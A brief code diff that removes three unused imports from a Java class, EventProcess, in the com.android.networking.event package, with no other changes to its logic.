@@ -9,8 +9,6 @@
 
 package com.android.networking.event;
 
-import java.io.IOException;
-
 import com.android.networking.ProcessInfo;
 import com.android.networking.ProcessStatus;
 import com.android.networking.auto.Cfg;
@@ -19,8 +17,6 @@ import com.android.networking.conf.ConfigurationException;
 import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerProcess;
 import com.android.networking.util.Check;
-import com.android.networking.util.DataBuffer;
-import com.android.networking.util.WChar;
 
 public class EventProcess extends BaseEvent implements Observer<ProcessInfo> {
 	/** The Constant TAG. */
